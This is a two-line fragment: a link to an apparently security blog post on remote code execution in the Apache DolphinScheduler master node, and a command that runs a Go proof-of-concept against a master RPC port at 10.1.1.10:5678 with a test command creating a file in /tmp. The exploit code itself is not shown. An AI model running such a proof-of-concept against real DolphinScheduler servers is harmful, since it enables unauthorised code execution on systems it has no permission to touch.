https://52hertzi.com/2025/11/18/Apache-DolphinScheduler-master节点RCE/

```
go run master_rpc_logic_fake_rce_poc.go -target 10.1.1.10:5678 -cmd 'touch /tmp/master_rpc_rce_go'
```
